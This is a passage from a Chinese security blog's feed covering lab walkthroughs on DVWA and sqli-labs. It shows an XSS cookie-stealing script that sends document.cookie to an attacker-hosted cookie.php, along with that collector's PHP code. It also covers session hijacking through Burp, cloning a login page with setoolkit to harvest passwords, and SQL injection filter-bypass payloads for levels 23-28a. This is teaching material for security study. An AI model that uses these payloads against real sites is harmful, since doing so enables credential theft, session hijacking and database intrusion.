title="demo"></a>demo</h2><table><thead><tr><th align="center"><code>插入payload后当前页面所有的a标签里href链接全部被修改成恶意链接</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827030148.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>反射型xss的话，刷新页面会恢复原来链接</p></li><li><p>如果是插入到存储型XSS中，那么会持久的替换网页的a标签的链接，造成很大的破坏</p></li><li><p>进一步扩大伤害的话可以配合beef进行(这里只是提一下，不会赘述)。</p></li></ul><h2 id="盗取用户信息"><a href="#盗取用户信息" class="headerlink" title="盗取用户信息"></a>盗取用户信息</h2><ul><li>盗取原理：克隆网站登录页面，利用XSS漏洞篡改网页链接，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号密码被存储</li></ul><h2 id="setookit"><a href="#setookit" class="headerlink" title="setookit"></a>setookit</h2><ul><li>setoolkit 是一款很强的社工工具，本次只是利用它其中的网站克隆功能</li><li>克隆步骤</li></ul><table><thead><tr><th align="center"><code>kali终端输入setooklit，进入选择页面，输入1，选择社会工程学</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031314.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>再选择2，网站攻击载体</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031452.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>再选择3，凭证攻击方法</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031529.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>选择2，网站克隆</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031612.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>ip地址选择默认，使用kali的地址即可，回车下一步</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031643.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>输入需要克隆的目标网页，然后回车，开始钓鱼</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031727.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>在url输入kali的地址，访问，发现已经克隆下来</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827031801.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h2><ul><li>用户点击利用xss漏洞所修改的链接时，会自动跳转</li></ul><table><thead><tr><th align="center"><code>重定向到了setookit克隆的登录页面</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827032102.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>当用户看到这个页面输入密码后,什么反应都没有但是kali已经读取到密码</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827032349.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>利用xss篡改网页链接，比较麻烦的就是构造恶意<code>JavaScript</code>代码</p></li><li><p>setookit功能较多，第一次上手需要了解一下各个功能的作用</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss窃取cookie利用</title>
    <link href="/2020/08/05/xss%E7%AA%83%E5%8F%96cookie%E5%88%A9%E7%94%A8/"/>
    <url>/2020/08/05/xss%E7%AA%83%E5%8F%96cookie%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS-窃取cookie"><a href="#XSS-窃取cookie" class="headerlink" title="XSS  窃取cookie"></a>XSS  窃取cookie</h2><h3 id="cookie介绍"><a href="#cookie介绍" class="headerlink" title="cookie介绍"></a><strong>cookie介绍</strong></h3><ul><li><p>cookie是在http协议下，服务器脚本可以维护客户工作站上信息的一种方式，cookie是由web服务器报错在用户浏览器上的小文本文件，它可以包含有关用户的信息</p></li><li><p>有些cookie是临时的，有些事持续的，临时的只在浏览器报错一段时间，一但超过规定时间，该cookie就会被系统清楚</p></li><li><p>服务器可以利用cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在http传输中的状态。cookies最典行的应用是判定注册用户是否已经登录网站，用户可能会得到提示，是否在下一次进入此网站时保留用户信息以便简化登录手续，这里都是cookies的功能，另一个重要应用场合是“购物车” 之类处理，用户可能会在一段时间内在同一家网站的不同页面选择不同的商品，这些信息都会写cookies，以便在最后付款时提取信息</p></li></ul><h3 id="XSS窃取cookie"><a href="#XSS窃取cookie" class="headerlink" title="XSS窃取cookie"></a><strong>XSS窃取cookie</strong></h3><ul><li><p>demo环境为dvwa</p></li><li><p>存在反射型XSS漏洞的站点位置，可以利用以下链接盗取cookie</p></li><li><p>编写一个cookie.php文件，放在自己网站下，用来收集受害者的cookie。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> $cookie = $_GET[<span class="hljs-string">'cookie'</span>];file_put_contents(<span class="hljs-string">"cookie.txt"</span>,$cookie);<span class="hljs-meta">?&gt;</span></code></pre><ul><li>在cookie.php同级目录下创建一个cookie.txt文件,给上读写权限 。</li><li>手动创建cookie.txt文件是因为file_put_contents()函数可能因为目录权限问题无法创建文件。</li></ul><table><thead><tr><th align="center"><code>读写权限不给上，会导致无法写入cookie</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826225954.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>这里以dvwa的存储型xss为例</p></li></ul><table><thead><tr><th align="center">f12修改输入框的最大文本长度，也就是maxlength的值，默认是50</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826230713.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>插入payload</li></ul><table><thead><tr><th align="center"><code>&lt;script&gt;document.location=&quot;http://192.168.5.139/test/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827002346.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>提交后会自动跳转到<code>document.location</code>里的链接</li></ul><table><thead><tr><th align="center">访问了事先创建好的cookie.php，提交了当前用户的cookie</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827002201.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">cookie.txt文件中多了受害者的cookie</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827000524.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>如果没有跳转的话可能是因为环境问题，或者是少了?cookie=后面的+号。</li></ul><h3 id="利用绕过验证登录"><a href="#利用绕过验证登录" class="headerlink" title="利用绕过验证登录"></a><strong>利用绕过验证登录</strong></h3><ul><li>账号密码随便输，burp截断，放掉带有账号密码的包，将第二个只有cookie没有账号密码的数据包发送到repeater</li><li>将cookie，替换成劫持到的cookie</li></ul><table><thead><tr><th align="center">点击go，显示了登录界面</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827000755.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">右键，选择浏览器打开，复制链接</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827001041.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">复制到浏览器中，成功绕过登录</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827001220.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>如果无法绕过验证的话，可能是dvwa版本的原因，新版多了csrf令牌。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>窃取cookie时，php代码没有执行写入cookie可以留意一下文件权限，这是个大坑。</li><li>payload不跳转可以检查一下是不是少了拼接符+号</li><li>绕过验证登录时，可能会因为csrf令牌不一致无法登录。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss跨站脚本分类</title>
    <link href="/2020/08/05/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB/"/>
    <url>/2020/08/05/xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS跨站脚本分类"><a href="#XSS跨站脚本分类" class="headerlink" title="XSS跨站脚本分类"></a>XSS跨站脚本分类</h2><h3 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a><strong>xss介绍</strong></h3><blockquote><ul><li>跨站脚本攻击 (Cross Site Scripting) 为了不和层叠样式表(Cascading Style Sheets CSS)的缩写混淆，故交跨站脚本攻击缩写为XSS，而已攻击者往Web页面里插入恶意script代码，当用户浏览该页知识，嵌入其中Web里面的script代码会被执行，从而达到而已攻击用户的目的</li></ul></blockquote><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a><strong>反射型XSS</strong></h3><blockquote><ul><li><p>攻击者通过邮件等形式将包含XSS代码的连接发送给正常用户，当用户点击时，服务器接收该用户的请求并进行处理，然后把带有XSS的代码发送给用户。用户浏览器解析执行代码，触发XSS漏洞</p></li><li><p>例如</p><ul><li><?php echo$_GET("uname")?>  </li><li>当用户访问url?<code>uname=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>时，触发代码，弹出对话框</li></ul></li><li><p>以dvwa为例</p><ul><li>弹出自定义内容</li></ul><table><thead><tr><th align="center"><code>&lt;scrip&gt;alert(&#39;hello&#39;) &lt;/script?&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201538.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>弹出当前网页cookie</li></ul><table><thead><tr><th align="center"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201642.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul></blockquote><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h3><blockquote><ul><li><p>存储型XSS又称持久型XSS，攻击脚本存储在目标服务器的数据库中，具有更强的隐蔽性</p><ul><li>攻击者在论坛，博客，留言板中，发帖的过程嵌入XSS代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发XSS代码</li></ul></li><li><p>案例</p><ul><li>点击提交就会不断的弹出弹框</li></ul><table><thead><tr><th align="center"><code>&lt;script&gt;alert(&quot;this is test&quot;)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201759.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul></blockquote><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a><strong>DOM型XSS</strong></h3><blockquote><ul><li>全称Document Object Model,使用DOM动态访问更新文档的内容，结构及样式</li></ul><table><thead><tr><th align="center">DOM结构图</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201915.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>HTML标签都是节点，节点组成了节点树。通过HTML DOM可以树上的所有结点进行修改</li><li>服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码，触发XSS漏洞。</li><li>案例</li></ul><table><thead><tr><th align="center">在url default中输入值可以插入到网页中</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826201951.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>&lt;script&gt;alert(&quot;hello world&quot;)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200826202029.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center">发现代码已经嵌入网页内</td></tr></tbody></table></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>xss本应叫css的，但为了不和层叠样式表重名，特意叫成xss</li><li>反射型xss，由服务端发送到浏览器，最后浏览器解析恶意代码。</li><li>存储型xss，和反射型的区别在于，存储型xss将恶意代码存储到了服务器中，能够持久化攻击</li><li>dom型xss，不同于前两者，dom型xss是基础dom文档对象模型的一种漏洞</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less23-28a</title>
    <link href="/2020/08/04/sqli-less23-less28a/"/>
    <url>/2020/08/04/sqli-less23-less28a/</url>
    
    <content type="html"><![CDATA[<h1 id="less23-less28a"><a href="#less23-less28a" class="headerlink" title="less23 -  less28a"></a>less23 -  less28a</h1><h3 id="less-23"><a href="#less-23" class="headerlink" title="less 23"></a>less 23</h3><ul><li>less23 在sql语句进行查询前，对id参数进行了<code>#,--</code>注释符号过滤。</li><li>直接上payload</li></ul><table><thead><tr><th align="center"><a href="http://192.168.5.139/Less-23/?id=-1&#39;union" target="_blank" rel="noopener">http://192.168.5.139/Less-23/?id=-1&#39;union</a> select 1,database(),’3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825001321.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>解释一下为什么payload这么构造</li></ul><pre><code class="hljs sql">此处的sql语句为<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-string">'-1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),%<span class="hljs-number">273</span>两个知识点：<span class="hljs-number">1.</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> 之所以<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span>，是因为<span class="hljs-keyword">sql</span>语句执行了两个<span class="hljs-keyword">select</span>语句，第一个<span class="hljs-keyword">select</span>为<span class="hljs-keyword">id</span>的选择语句，第二个为自己构造的<span class="hljs-keyword">select</span>语句。只有一个数据可以输出，所以需要第一个<span class="hljs-keyword">select</span>没有结果。<span class="hljs-number">2.</span> <span class="hljs-number">-1</span><span class="hljs-string">' union select 1,select database(),'</span><span class="hljs-number">3</span> 第一个单引号用于闭合<span class="hljs-number">-1</span>,第二个单引号闭合后面的单引号，这样查询内容即可显示在username处</code></pre><ul><li>还可以用报错注入，延迟注入， 可以or ‘1’ = ‘1进行闭合。</li><li>这里好像有点问题，截断数据包后，如果payload全是明文的话，直接报语法错误了，最好经过url编码转换一下</li></ul><table><thead><tr><th align="center">%27or%20extractvalue(1,concat(0x7e,database()))%20or%20%271%27=%27</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825002645.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>查询数据库，payload也是同上，部分符号需要转换成url编码</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(schema_name)from%20information_schema.schemata),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003223.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>获取security库的数据表</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003409.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>查询users表的所有列</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003536.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>获取users表的内容</li></ul><table><thead><tr><th align="center">%27union%20select%201,(select%20group_concat(username)%20from%20security.users%20limit%200,1),%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825003833.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h2><ul><li><p>如果这关登录成功后，没有进行修改密码的操作的话，可能是因为logged-in.php文件的问题，重新下载解压，解压过程中选择覆盖即可。</p></li><li><p>less24为二次注入，二次注入也是存储型注入。要解释的话，那就是将可能导致sql注入的字符插入到数据库中，当调用这个恶意字符时，就可以出发sql注入。</p></li><li><p>二次注入流程：</p></li></ul><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> 客户端构造数据，通过浏览器提交http数据报文请求到服务端进行处理，报文中存在sql语句或命令<span class="hljs-number">2.</span> 服务端将客户端提交的信息进行存储<span class="hljs-number">3.</span> 客户端向服务端发送和第一个请求不一样的http数据报文<span class="hljs-number">4.</span> 服务端收到客户端的请求后，处理该请求，查询第一次请求的数据，导致客户端第一次请求中构造的sql语句或命令触发<span class="hljs-number">5.</span> 客户端返回服务端的执行结果，客户端可以通过返回信息判断二次注入是否触发</code></pre><ul><li><p>demo</p><table><thead><tr><th align="center">原始数据为</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015138.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">注册admin’#账号</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015230.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">数据库中出现了admin‘# 用户的数据，同时密码为111，且admini用户的密码为123456</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015348.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">登录admin’# 修改密码</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825015453.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>可以看到修改的是admin’# 用户的密码，但实际却是admin用户，因为sql语句变为了<code>update users set passwd=&quot;new_passwd&quot; where username = &#39;admin&#39;#</code>，导致了二次注入，从而修改了admin用户的密码</li></ul></li></ul><h2 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h2><ul><li>less25主要为 <code>and or</code>字符过滤，几个常用的绕过思路</li></ul><pre><code class="hljs sql">大小写绕过 Or,OR,oR双写绕锅 oorr编码绕过 hex,urlencode内联注释 <span class="hljs-comment">/*or*/</span>利用符号绕过 or=&amp;&amp; or = ||暂时想到这些后续有的话会补充</code></pre><ul><li>这里使用的是利用符号绕过</li><li>demo，<ul><li>这里有个坑就是，不知道为什么在burp重放中，如果空格和单引号不是url编码的话，提交后返回的结果是报错的</li><li>最好将部分符号进行urlencode</li></ul></li></ul><table><thead><tr><th align="center">%27%20||extractvalue(1,concat(0x7e,(select version()),0x7e))%20–+</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825020634.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h2><ul><li>同上一关比较，less25a对id没有进行<code>&#39;&#39;</code>包含，同时没有输出报错信息，所以直接pass掉报错注入</li><li>其余没区别，这里使用联合注入.</li></ul><table><thead><tr><th align="center">%20union%20select%201,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825021320.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h2><ul><li><p>如果这关在windows系统下，无法使用特殊字符代替空格的话，这个锅由apache来背。将平台更换到linux下就解决了。</p></li><li><p>本关在less25的基础上，对常用的关键字及符号<code>or,and,/*,#,--</code>等符号进行过滤。对绕过and及or的方法参考less25，这里不再赘述。</p></li><li><p>注释和结尾字符，只能构造一个<code>&#39;</code>来闭合后面的<code>&#39;</code>, 空格的方法就比较多了</p></li></ul><pre><code class="hljs sql">%09 tab键(水平制表键)%0a 新建一行%0c 新建一页%0d return功能%0b tab键(垂直制表键)%a0 空格</code></pre><ul><li>payload/sql语句及解释</li></ul><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where id =<span class="hljs-string">'$id'</span>  limit 0,1给一个简单的payload?<span class="hljs-attribute">id</span>=-1'%a0||'1提交的sql语句为 select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=<span class="hljs-string">'-1'</span> || <span class="hljs-string">'1'</span> limit 0,1 第一个<span class="hljs-string">'闭合id='</span><span class="hljs-variable">$id</span><span class="hljs-string">'的单引号，%0a为空格。（此处环境为unbunt14.04.1+apache+mysql_php，可以解析%0a。之前使用windows+wamp测试是无法解析%0a的）</span></code></pre><table><thead><tr><th align="center"><a href="http://192.168.5.139/Less-26/?id=-1%27%a0" target="_blank" rel="noopener">http://192.168.5.139/Less-26/?id=-1%27%a0</a></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825022712.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>后续的注入，可以参考前面的关卡来进行更改sql语句。这里不进行一一操作。</li></ul><h2 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h2><ul><li><p>这关和less26的区别在于，sql语句的处理上多了一个(),同时抛出错误后不在前排输出。pass掉报错注入后，依旧可以用联合注入</p></li><li><p>与less26 一致，用<code>&#39;)</code>闭合前面的<code>&#39;</code>，接着跟上构造的payload，最后利用<code>(&#39;1</code>进行彼闭合</p></li></ul><table><thead><tr><th align="center">?id=-1000%27)union%a0select%a01,user(),(%273</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825023551.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>可以将user()替换成想要的sql语句，同时也可以进行延迟注入，参考前文。</li></ul><h2 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h2><ul><li>在上一关的基础上，增加了对<code>union,select</code>的关键字过滤。依旧可以使用less26的方式，只不过需要对union和select进行大小写混合</li></ul><table><thead><tr><th align="center">?id=-234%27UniOn%a0sElECt%a01,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825024316.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>也可以用双写uniunionon进行绕过(经测试双写select好像不行)，亦可用报错注入或延迟注入。</li></ul><table><thead><tr><th align="center">?id=-234%27uniunionon%a0SeLect%a01,database(),3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825024659.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h2><ul><li>和上一关的区别是对于id的处理，这里用的是”$id”,同时mysql错误不会在前端显示。</li><li>根据上一关，给出一个demo payload</li></ul><table><thead><tr><th align="center">?id=100%%22%a0UnIon%a0SElecT%a01,user(),%223</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825025706.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h2><ul><li>本关和less27基本一致，不过对id的处理变成了（’$id’）</li><li>直接给出payload</li></ul><table><thead><tr><th align="center">?id=100%27)unIon%0BsElect%0B1,@@basedir,3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825030126.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h2><ul><li>同上一关一致，只是少了几个过滤条件。</li></ul><table><thead><tr><th align="center">?id=100%27)unIon%0bsElect%0b1,version(),3</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200825030349.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>需要消化的几个知识点</strong></p><ul><li>二次注入的流程及利用</li><li>能够替换空格的常见符号<ul><li>%09 tab键(水平制表键)</li><li>%0a 新建一行</li><li>%0c 新建一页</li><li>%0d return功能</li><li>%0b tab键(垂直制表键)</li><li>%a0 空格</li></ul></li><li>常见字符及关键字的绕过<ul><li>大小写绕过</li><li>双写绕过</li><li>编码绕过</li><li>内联注释绕过</li><li>利用符号绕过</li></ul></li><li>还有一点就是sqli平台的记录，暂时到此为止。需要伸展一下其他方面的技能树才行，后续有时间的话会补上。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-less17-22</title>
    <link href="/2020/08/03/sqli-less17-22/"/>
    <url>/2020/08/03/sqli-less17-22/</url>
    
    <content type="html"><![CDATA[<h1 id="less17-less22"><a href="#less17-less22" class="headerlink" title="less17 - less22"></a>less17 - less22</h1><h3 id="mysql函数介绍"><a href="#mysql函数介绍" class="headerlink" title="mysql函数介绍"></a>mysql函数介绍</h3><ul><li>在前面的sql注入中经常用到的语句就是增删改查了，前面都是查，在这里把增删改补上。</li></ul><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><ul><li><p>insert 该函数用于增加数据</p><ul><li>增加一行数据</li></ul><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">values</span>(<span class="hljs-string">"字段对应的值"</span>)<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">values</span>(<span class="hljs-string">"16"</span>,<span class="hljs-string">"daming"</span>,<span class="hljs-string">"man"</span>)</code></pre></li></ul><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><ul><li><p>删除结构</p><ul><li>删除数据库<code>drop dabase db_name</code></li><li>删除表<code>drop table table_name</code></li></ul></li><li><p>删除数据</p><ul><li><code>delete from 表名;</code></li><li><code>delete from 表名 where id=1;</code></li></ul><pre><code class="hljs sql"><span class="hljs-comment"># demo</span>delect from  users where id=16;</code></pre></li></ul><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><ul><li>修改所有: <code>update table_name set column_name = &quot;new_value;&quot;</code> </li><li>带条件的修改<code>update table_name set column_name = &quot;new_value&quot;where id=6</code></li></ul><pre><code class="hljs mysql"># demoupdate users set username&#x3D;&quot;test&quot; where id&#x3D;&quot;15&quot;</code></pre><h2 id="三个新函数"><a href="#三个新函数" class="headerlink" title="三个新函数"></a>三个新函数</h2><ul><li><p>addslashes() 在预定义字符前添加反斜杠</p><ul><li>预定义字符为：</li></ul><pre><code class="hljs sql">单引号 (')双引号 (")反斜杠 (\)NULL</code></pre><ul><li><p>该函数可用于需要存存储到数据库中的字符串及数据库查询语句字符串</p></li><li><p>需要注意一点：默认情况下，php对所有的<code>GET,POST 